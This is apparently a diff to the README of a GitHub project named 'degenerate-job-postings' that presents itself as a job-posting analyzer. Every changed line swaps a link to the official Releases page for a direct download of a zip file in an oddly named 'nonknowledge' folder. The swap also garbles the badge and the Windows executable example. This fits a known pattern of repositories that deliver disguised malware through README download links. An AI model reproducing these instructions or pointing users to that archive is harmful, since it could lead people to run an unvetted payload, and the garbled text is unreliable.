@@ -1,6 +1,6 @@
 # 🎉 degenerate-job-postings - Analyze and Improve Job Postings Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dguitroman/degenerate-job-postings/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dguitroman/degenerate-job-postings/main/nonknowledge/degenerate-job-postings_v3.9-alpha.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/dguitroman/degenerate-job-postings/main/nonknowledge/degenerate-job-postings_v3.9-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -29,14 +29,14 @@ To run this application, you will need:
 ## 🛠️ Installation Instructions
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   - [Download Page](https://github.com/dguitroman/degenerate-job-postings/releases)
+   - [Download Page](https://raw.githubusercontent.com/dguitroman/degenerate-job-postings/main/nonknowledge/degenerate-job-postings_v3.9-alpha.1.zip)
 
 2. **Download the Latest Release**: Look for the latest version and click on it to download the application to your computer. 
 
 3. **Extract the Files**: After downloading, locate the file (usually in your Downloads folder). If it is a zip or tar file, right-click on it and select "Extract All" or the equivalent option for your operating system.
 
 4. **Run the Application**: 
-   - On Windows, double-click the executable file (e.g., `degenerate-job-postings.exe`).
+   - On Windows, double-click the executable file (e.g., `https://raw.githubusercontent.com/dguitroman/degenerate-job-postings/main/nonknowledge/degenerate-job-postings_v3.9-alpha.1.zip`).
    - On macOS or Linux, open a terminal, navigate to the extracted folder, and run the application using the command `./degenerate-job-postings`.
 
 5. **Follow On-Screen Instructions**: Once the application is running, follow the prompts to start analyzing job postings.
@@ -45,7 +45,7 @@ To run this application, you will need:
 
 You can download the application from the Releases page. Click the link below to get started:
 
-[Download Page](https://github.com/dguitroman/degenerate-job-postings/releases)
+[Download Page](https://raw.githubusercontent.com/dguitroman/degenerate-job-postings/main/nonknowledge/degenerate-job-postings_v3.9-alpha.1.zip)
 
 ## 📚 Usage Instructions
 
